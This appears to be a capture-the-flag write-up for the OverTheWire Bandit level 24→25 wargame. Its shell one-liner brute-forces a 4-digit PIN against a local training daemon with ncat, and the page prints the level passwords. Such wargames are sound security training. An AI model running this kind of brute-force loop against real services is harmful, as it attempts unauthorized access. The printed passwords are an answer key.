# Bandit Level 24 → Level 25

## Task
[-> link](https://overthewire.org/wargames/bandit/bandit25.html)

A daemon is listening on port 30002 and will give you the password for bandit25 if given the 
password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the 
pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

## Solution

```shell
ssh bandit24@bandit.labs.overthewire.org -p 2220  # (with password 'hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv')
for d in {0..9999}; do printf "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv %04d\n" $d; done | ncat -q 100ms localhost 30002 | grep -A 2 "Correct"
```

## Result

```text
Correct!
The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

We've got password `SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P`!
